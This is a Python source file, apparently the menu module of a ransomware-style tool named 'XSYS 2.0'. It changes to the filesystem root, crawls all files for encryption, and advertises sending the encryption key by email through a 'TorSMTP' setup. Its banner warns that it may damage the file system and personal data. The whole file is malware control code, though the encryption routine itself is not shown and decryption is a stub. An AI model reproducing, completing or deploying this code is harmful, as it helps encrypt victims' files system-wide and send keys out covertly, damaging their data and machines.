#!/usr/bin/env python
import os
from com.xsys.crawler.Crawler import Crawler
from com.xsys.smtp.MailSender import Sender


class Menu(Crawler, Sender):

    def __init__(self):
        super(Menu, self).__init__()
        self.init()

    def init(self):
        self.clear_console()
        self.show_first_menu()
        while 1:
            main_choice = input("[?] Which operation would you like to do...?\n\tD -> Decrypt\n\tE -> Encrypt\n[$] ")
            hex_m_choice = hex(ord(main_choice.lower()))
            # hex(dec("e")) = 0x65
            if hex_m_choice.__eq__(self.HEX_e):
                enc_choice = input("[?] Which search operation would you prefer?\n\tR -> Recursive\n\tL -> Linear\n[$] ")
                hex_e_choice = hex(ord(enc_choice.lower()))
                # hex(dec("r")) = 0x72
                if hex_e_choice.__eq__(self.HEX_r):
                    print('cwd: {0}'.format(os.getcwd()))
                    os.chdir('/')
                    print('cwd: {0}'.format(os.getcwd()))
                    rtar_files = self.recursive_file_crawler()
                    for file in rtar_files:
                        print(file)
                # hex(dec("l")) = 0x6c
                elif hex_e_choice.__eq__(self.HEX_l):
                    print('cwd: {0}'.format(os.getcwd()))
                    os.chdir('/')
                    print('cwd: {0}'.format(os.getcwd()))
                    ltar_files = self.linear_file_crawler()
                    for file in ltar_files:
                        pass
                        #print(file)
                else:
                    print('[!] "{0}" is not supported choice..!'.format(hex_e_choice))
                    self.clear_console()
                    continue
            # hex(dec("d")) = 0x64
            elif hex_m_choice.__eq__(self.HEX_d):
                pass
            else:
                print('[!] "{0}" is not supported choice..!'.format(hex_m_choice))
                self.clear_console()
                continue

    @staticmethod
    def show_first_menu():
        a1 = "\n\t\t################################"
        a2 = "\n\t\t## ~~~~~~~~ XSYS 2.0 ~~~~~~~~ ##"
        a3 = "\n\t\t##   Encrypt   ||   Decrypt   ##"
        a4 = "\n\t\t## ~~~~~~~~~~~~~~~~~~~~~~~~~~ ##"
        a5 = "\n\t\t## .....M.a.d.e....B.y....... ##"
        a6 = "\n\t\t##    Yahav   N   Hoffman     ##"
        a7 = "\n\t\t##          a.k.a.            ##"
        a8 = "\n\t\t## T 0 x 1 c  E n v 3 1 o p e ##"
        a9 = "\n\t\t################################"
        a0 = '{0}{1}{2}{3}{4}{5}{6}{7}{8}\n\n'.format(a1, a2, a3, a4, a5, a6, a7, a8, a9)
        x1 = " Attention !!\n"
        x2 = " This program may cause harm to your computer files system, machine functionality,\n"
        x3 = " personal data and private information.\n"
        x4 = " XSYS is a tool that build an Hierarchical Tree diagram of\n"
        x5 = " all files from your root folder and its descendants until its (E)ncrypt || (D)ecrypt any leaf\n"
        x6 = " in the system tree diagram.\n"
        print('{0}{1}{2}{3}{4}{5}{6}'.format(a0, x1, x2, x3, x4, x5, x6))

    @staticmethod
    def choice_menu():
        a1 = "[!] You can send the encryption key to your personal email\n"
        a2 = "    via our TorSMTP configuration."
        print('{0}{1}'.format(a1, a2))


if __name__ == "__main__":
    menu = Menu()
    menu.init()
